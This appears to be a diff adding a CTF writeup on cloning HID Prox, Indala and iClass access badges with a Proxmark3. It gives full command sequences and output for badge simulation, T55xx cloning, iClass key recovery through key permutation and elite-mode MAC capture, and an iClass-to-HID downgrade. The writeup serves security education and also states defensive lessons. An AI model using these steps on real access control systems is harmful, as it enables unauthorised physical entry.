@@ -1,0 +1,381 @@
+---
+title: "RFHS RFCTF RFID: Cloning HID, Indala, and iClass Tags with a Proxmark"
+date: 2026-03-15
+description: "CTF writeup covering low-frequency HID and Indala cloning, iClass key recovery via permutation and elite-mode MAC capture, and a downgrade attack."
+pageType: writeup
+tags: ["rfid", "ctf", "hardware"]
+draft: false
+---
+
+The Radio Frequency Hacker Sanctuary (RFHS) Radio Frequency CTF (RFCTF) is a hardware-focused radio challenge that runs alongside larger security conferences. The RFID track challenges competitors to use a Proxmark3 to bypass access control cards. Your job is to read, clone, or crack each one. What follows is a writeup of the challenges I worked through, along with the terminal output exactly as it came off the device.
+
+## A Quick Proxmark Primer
+
+The [Proxmark3](https://github.com/rfidresearchgroup/proxmark3) is the standard multi-protocol RFID research tool. It handles both **low-frequency (LF)** tags — 125 kHz standards like HID Prox and Indala — and **high-frequency (HF)** tags — 13.56 MHz standards like iClass (also known as PicoPass) and MIFARE. The `pm3` client is the shell you interact with over USB. Most workflows follow the same pattern:
+
+1. **Read** — identify the card type and extract its raw ID or dump its memory.
+2. **Clone / Simulate** — replay that data to a reader, either by writing to a blank T55xx card or by having the Proxmark impersonate the tag in software.
+
+The split between `lf` (low-frequency) and `hf` (high-frequency) commands maps directly to the two antenna coils on the hardware.
+
+A cheaper alternative for pure emulation is the [Chameleon Ultra](https://github.com/RfidResearchGroup/ChameleonUltra) — a compact, battery-powered device that can store and replay LF credentials (HID Prox, Indala, EM4100) and HF ISO 14443A cards (MIFARE, etc.). It cannot emulate iClass/PicoPass and has no active attack capability, so it covers the simpler end of the challenges covered here. See the summary table for a breakdown.
+
+---
+
+## Challenge 1 — HID Prox: Read and Replay
+
+The first target was a standard HID Prox badge, the kind protecting office doors everywhere. Start with a generic search:
+
+```
+[usb] pm3 --> lf search
+[=] NOTE: some demods output possible binary
+[=] if it finds something that looks like a tag
+[=] False Positives ARE possible
+[=]
+[=] Checking for known tags...
+
+[+] HID Prox TAG ID: 200600818e (16583) - Format Len: 26bit - OEM: 000 - FC: 0 - Card: 16583
+
+[+] Valid HID Prox ID found!
+
+[+] Chipset detection : EM4x05/EM4x69 found
+[+] Try `lf em 4x05` commands
+```
+
+`lf search` scans through every known LF demodulation algorithm and reports a match. Here it found a 26-bit HID Prox ID of `200600818e` with facility code (FC) 0 and card number 16583. Simulating is one command:
+
+```
+[usb] pm3 --> lf hid sim 200600818e
+[+] Simulating HID tag with ID 200600818e
+[+] Press pm3-button to abort simulation
+[=] You can cancel this operation by pressing the pm3 button
+```
+
+Hold the Proxmark to the reader and the door sees a valid card. The reader has no way to distinguish the simulated RF signal from the original badge.
+
+---
+
+## Challenge 2 — HID from a Photo
+
+This one was more creative. The challenge gave competitors a **photograph of a physical HID badge**. The card number was printed on the front — in this case `13118` — but a physical card to scan was nowhere in sight. The goal was to figure out the correct Wiegand encoding and simulate it.
+
+HID supports many different bit-length formats (26-bit, 33-bit, 34-bit, 36-bit, 37-bit…). The right format matters because readers are programmed to only accept a specific one. The `lf hid wiegand` command enumerates them all given an OEM code, facility code, and card number:
+
+```
+[usb] pm3 --> lf hid wiegand 0 0 13118
+HID | OEM | FC   | CN      |  Wiegand  |  HID Formatted
+----+-----+------+---------+-----------+--------------------
+ 26 | 000 | 000  | 13118   | 667C      |  200400667C
+ 33 | 000 | 000  | 13118   | 0         |  0
+ 34 | 000 | 000  | 13118   | 667C      |  240000667C
+ 35 | 000 | 000  | 13118   | 0         |  0
+ 36 | 000 | 000  | 13118   | 8000199F1 |  1000000000000000
+ 37 | 000 | 000  | 13118   | 667C      |  E000000000000000
+ 38 | 000 | 000  | 13118   | 199F0     |  C000000000000000
+ 40 | 000 | 000  | 13118   | 0         |  0
+```
+
+26-bit HID Prox is by far the most common format in the wild, so `200400667C` is the first guess. Simulate it and see if the reader accepts it:
+
+```
+[usb] pm3 --> lf hid sim 200400667C
+[+] Simulating HID tag with ID 200400667c
+[+] Press pm3-button to abort simulation
+[=] You can cancel this operation by pressing the pm3 button
+```
+
+It worked. The lesson is that modern HID readers almost universally speak 26-bit Wiegand, so even when you cannot scan the original card, a visible card number is enough to reconstruct a working credential. Printing badge numbers right on the badge is a security antipattern, but it is extremely common.
+
+---
+
+## Challenge 3 — Indala: Read and Clone
+
+Indala is an older 125 kHz proprietary protocol owned by HID. It was popular before HID Prox became dominant and still appears in legacy installations. Same starting point — a generic search:
+
+```
+[usb] pm3 --> lf search
+[=] NOTE: some demods output possible binary
+[=] if it finds something that looks like a tag
+[=] False Positives ARE possible
+[=]
+[=] Checking for known tags...
+
+[+] Indala Found - bitlength 64, Raw a00000009ddc4cb2
+
+[+] Possible de-scramble patterns
+[+]     Printed     | __1822__  [0x71E]
+[+]     Internal ID | 500976818
+
+[+] Valid Indala ID found!
+
+[+] Chipset detection : T55xx found
+[+] Try `lf t55xx` commands
+```
+
+Indala's raw 64-bit value is `a00000009ddc4cb2`. The Printed and Internal ID fields show how that raw value maps to what might be stamped on the card itself — useful cross-reference if you ever get a card number from a photo or a spreadsheet.
+
+If you have a blank T55xx card handy, clone directly to it:
+
+```
+[usb] pm3 --> lf indala clone a00000009ddc4cb2
+[=] Preparing to clone Indala 64bit tag with RawID A0 00 00 00 9D DC 4C B2
+```
+
+A T55xx is a writable LF emulator chip. The resulting card works as a physical copy even after the Proxmark is disconnected — hand it off, tap through a turnstile, or leave it near a reader unattended.
+
+No blank card? The Proxmark can simulate the tag directly:
+
+```
+[usb] pm3 --> lf indala sim a00000009ddc4cb2
+[+] Simulating Indala tag with Raw a00000009ddc4cb2
+[+] Press pm3-button to abort simulation
+[=] You can cancel this operation by pressing the pm3 button
+```
+
+The tradeoff is that simulation requires the Proxmark to stay powered and held near the reader — the moment you pull it away the signal stops. For a CTF where you just need to tap a reader once, simulation is faster than hunting for a blank card.
+
+---
+
+## Challenge 4 — iClass: Key Derivation from a Permuted Key
+
+iClass (PicoPass) operates at 13.56 MHz and is considerably more complex than the LF tags above. It uses a mutual-authentication challenge-response, which means you cannot just replay a captured ID — the tag must prove it knows a secret key during every transaction. The `hf` (high-frequency) commands handle it:
+
+```
+[usb] pm3 --> hf search
+[=] Checking for known tags...
+
+  CSN: E9 A2 8A 00 F7 FF 12 E0
+   CC: FE FF FF FF FF FF FF FF
+	Mode: Application [Locked]
+	Coding: ISO 14443-2 B/ISO 15693
+[+]	Crypt: Secured page, keys not locked
+[!]	RA: Read access not enabled
+ Mem: 2 KBits/2 App Areas (31 * 8 bytes) [1F]
+
+	AA1: blocks 06-12
+	AA2: blocks 13-1F
+	OTP: 0xFFFF
+
+KeyAccess:
+	Read A - Kd or Kc
+	Read B - Kd or Kc
+	Write A - Kc
+	Write B - Kc
+	Debit  - Kd or Kc
+	Credit - Kc
+
+[+] Valid iClass tag / PicoPass tag found
+```
+
+The Card Serial Number (CSN) is `E9 A2 8A 00 F7 FF 12 E0`. The card is in a locked application mode. To dump the data you need the diversified key.
+
+In a real engagement — or a CTF that doesn't hand you the key — the first move is to try the well-known iClass default keys. HID ships cards with a standard diversification key (Kd) that many deployments never change. The Proxmark can test a dictionary of known keys in seconds:
+
+```
+[usb] pm3 --> hf iclass chk
+[=] Checking iClass known keys...
+[+] found valid key: AFA785A7DAB33378
+```
+
+If `chk` comes up empty, the card uses a site-specific or elite key — at that point you escalate to the MAC capture attack described in Challenge 5.
+
+In this case the CTF gave the key directly, but in **permuted** form. That detail is a clue in itself: it's the same `AFA785A7DAB33378` default Kd, just stored the way HID's firmware represents it internally. HID stores iClass keys with a specific byte permutation; the `permute` command reverses it:
+
+```
+[usb] pm3 --> hf iclass permute r 3F90EBF0910F7B6F
+[+] input permuted key | 3F 90 EB F0 91 0F 7B 6F
+[+]     unpermuted key | AF A7 85 A7 DA B3 33 78
+[+]                key | AE A6 84 A6 DA B2 32 78
+[+] holiman iclass key | AF A7 85 A7 DA B3 33 78
+```
+
+The "holiman" key (`AFA785A7DAB33378`) is what the Proxmark needs. Dump the card:
+
+```
+[usb] pm3 --> hf iclass dump k AFA785A7DAB33378
+[+] retry to select card
+
+.------+--+-------------------------+
+CSN   |00| E9 A2 8A 00 F7 FF 12 E0 |
+------+--+-------------------------+
+      |01| 12 FF FF FF 7F 1F FF 3C | .......<
+      |02| FE FF FF FF FF FF FF FF | ........
+      |03| 19 CF 49 76 3A F9 0C DE | ..Iv:...
+      |04| FF FF FF FF FF FF FF FF | ........
+      |05| FF FF FF FF FF FF FF FF | ........
+      |06| 03 03 03 03 00 03 E0 17 | ........
+      |07| 50 5F 4F 4D F0 5F 9A 17 | P_OM._..
+      |08| 2A D4 C8 21 1F 99 68 71 | *..!..hq
+      |09| 2A D4 C8 21 1F 99 68 71 | *..!..hq
+      |0A| FF FF FF FF FF FF FF FF | ........
+      ...
+------+--+-------------------------+
+[+] saving dump file - 19 blocks read
+[+] saved 152 bytes to binary file iclass_tagdump-e9a28a00f7ff12e0.bin
+[+] saved 19 blocks to text file iclass_tagdump-e9a28a00f7ff12e0.eml
+```
+
+Load the dump into the Proxmark's emulator memory and simulate:
+
+```
+[usb] pm3 --> hf iclass eload f iclass_tagdump-e9a28a00f7ff12e0.bin
+[+] sent 152 bytes of data to device emulator memory
+
+[usb] pm3 --> hf iclass sim 3
+```
+
+Mode 3 plays back a full iClass card — the Proxmark will respond to authentication challenges using the key and the stored block data. Place it near the reader to complete the challenge.
+
+---
+
+## Challenge 5 — iClass: Breaking an Unknown Key with Elite-Mode Attack
+
+The hardest iClass challenge had no key hint. The card used a **custom (elite) diversification scheme**, which means the factory default key does not work and there is no public standard to reverse. The attack requires actively eavesdropping on the reader's authentication attempts using the Proxmark as a rogue card.
+
+First, identify the tag:
+
+```
+[usb] pm3 --> hf search
+[=] Checking for known tags...
+
+  CSN: B5 B5 25 00 F8 FF 12 E0
+   CC: FF FF FF FF E1 FF FF FF
+	Mode: Application [Locked]
+	Coding: ISO 14443-2 B/ISO 15693
+[+]	Crypt: Secured page, keys not locked
+[!]	RA: Read access not enabled
+ Mem: 16 KBits/16 App Areas (255 * 8 bytes) [1F]
+...
+[+] Valid iClass tag / PicoPass tag found
+```
+
+Then run `hf iclass sim 2` — the elite-mode attack. The Proxmark presents a set of known CSNs (card serial numbers) to the reader one at a time. Each presentation triggers the reader to send a MAC (Message Authentication Code) computed with its master key over that CSN. By collecting MACs for several known CSNs, Proxmark captures enough material to brute-force the key offline:
+
+```
+[usb] pm3 --> hf iclass sim 2
+[=] Starting iCLASS sim 2 attack (elite mode)
+...
+[=] press Enter to cancel
+
+#db# [+] going into attack mode, 9 CSNS sent
+...
+#db# [+] CSN: 01 .... e0 OK
+...
+#db# [+] CSN: 0c .... e0 OK
+...
+#db# [+] CSN: 10 .... e0 OK
+...
+#db# [+] CSN: 13 .... e0 OK
+...
+#db# [+] CSN: 07 .... e0 OK
+...
+#db# [+] CSN: 14 .... e0 OK
+...
+#db# [+] CSN: 17 .... e0 OK
+...
+#db# [+] CSN: ce .... e0 OK
+...
+#db# [+] CSN: d2 .... e0 OK
+
+[+] 9 out of 9 MAC obtained [OK]
+[+] saved 216 bytes to binary file iclass_mac_attack-2.bin
+```
+
+The `[-] bad XX at Y:Z` lines are normal RF noise during the attack — they reflect framing errors while the Proxmark cycles through its fake CSNs. What matters is collecting all 9 MAC pairs successfully. With the capture file in hand, run `loclass` — a dedicated brute-force tool bundled with the Proxmark client:
+
+```
+[usb] pm3 --> hf iclass loclass f iclass_mac_attack-2.bin
+----------------------------
+[=] Bruteforcing byte 1
+[=] Bruteforcing byte 0
+[=] Bruteforcing byte 69
+ 1,  2,  3, ... 41,
+[=] 1: 0x4c
+[=] 0: 0xb8
+[=] 69: 0x29
+----------------------------
+[=] Bruteforcing byte 2
+[=] Bruteforcing byte 4
+[=] 2: 0x9b
+[=] 4: 0x58
+----------------------------
+...
+[+] time: 10 seconds
+
+[+] -- High security custom key (Kcus) --
+[+] Standard format    = 3016bfa6d0179112
+[+] iClass format      = 5c100df7042eae64
+
+[+] Key verified ok!
+```
+
+Ten seconds of brute force and the key falls out. Dump using the discovered key, load, and simulate the same way as Challenge 4:
+
+```
+[usb] pm3 --> hf iclass dump k 5c100df7042eae64
+.------+--+-------------------------+
+CSN   |00| B5 B5 25 00 F8 FF 12 E0 |
+------+--+-------------------------+
+      |01| 12 FF FF FF E9 1F FF 3C | .......<
+      |02| FF FF FF FF E1 FF FF FF | ........
+      |03| A6 CF 51 B4 4D 3A 5E 5B | ..Q.M:^[
+      |06| 00 00 00 00 00 00 E0 14 | ........
+      |07| 00 00 00 20 01 D1 8A 7C | ... ...|
+      ...
+------+--+-------------------------+
+[+] saving dump file - 19 blocks read
+[+] saved 152 bytes to binary file iclass_tagdump-b5b52500f8ff12e0.bin
+[+] saved 19 blocks to text file iclass_tagdump-b5b52500f8ff12e0.eml
+
+[usb] pm3 --> hf iclass eload iclass_tagdump-b5b52500f8ff12e0.bin
+```
+
+---
+
+## Bonus: Downgrade Attack (iClass → HID)
+
+This one is worth calling out explicitly from my notes. Many physical access control deployments run readers that accept **both** iClass and HID Prox cards — they were installed alongside each other as a migration path and nobody removed the old protocol. That creates a cross-protocol downgrade opportunity.
+
+**Step 1 — Extract the Wiegand ID from the iClass dump.**
+
+The access credential is encoded in application blocks 06 and 07 (the first two blocks of AA1). You can see them in the dump output from Challenge 4:
+
+```
+|06| 03 03 03 03 00 03 E0 17 | ........
+|07| 50 5F 4F 4D F0 5F 9A 17 | P_OM._..
+```
+
+Reading those raw bytes is non-trivial — the Proxmark client can decode the EML file for you:
+
+```
+[usb] pm3 --> hf iclass decode f iclass_tagdump-e9a28a00f7ff12e0.eml
+[+] Wiegand: 26bit  FC: 3  CN: 16583
+[+] HID Formatted: 200600818e
+```
+
+That `200600818e` is the same HID Prox ID that appeared on the first challenge card — the iClass and HID badges share the same underlying credential, which is exactly the premiss of this attack.
+
+**Step 2 — Simulate it as an HID badge.**
+
+```
+[usb] pm3 --> lf hid sim 200600818e
+[+] Simulating HID tag with ID 200600818e
+[+] Press pm3-button to abort simulation
+```
+
+The reader processes the incoming Wiegand value regardless of which transport — iClass or HID — delivered it. If the access control system grants the iClass credential, it will also grant the weaker HID clone of the same Wiegand ID, even without ever cracking the iClass crypto. The fix is to disable legacy HID Prox on any reader that manages iClass cards.
+
+---
+
+## Summary
+
+The Proxmark handles every layer of this stack. The weakest link in most real deployments is not the crypto — it is the operational decision to keep legacy protocols enabled long after a rollout was supposed to be complete.
+
+| Protocol | Frequency | Attack Path | Chameleon Ultra? |
+|---|---|---|---|
+| HID Prox (from card) | 125 kHz | `lf search` → `lf hid sim` | ✅ Read + emulate |
+| HID Prox (from photo) | 125 kHz | `lf hid wiegand` → `lf hid sim` | ✅ Emulate (compute Wiegand on Proxmark first) |
+| Indala | 125 kHz | `lf search` → `lf indala sim` or `lf indala clone` | ✅ Read + emulate |
+| iClass (known key, permuted) | 13.56 MHz | `hf iclass permute r` → `hf iclass dump` → `hf iclass sim 3` | ❌ iClass not supported |
+| iClass (unknown elite key) | 13.56 MHz | `hf iclass sim 2` → `hf iclass loclass` → `hf iclass dump` → `hf iclass sim 3` | ❌ No attack capability |
+| iClass → HID downgrade | both | dump iClass Wiegand → `lf hid sim` | ⚠️ HID sim only (need Proxmark for iClass dump step) |
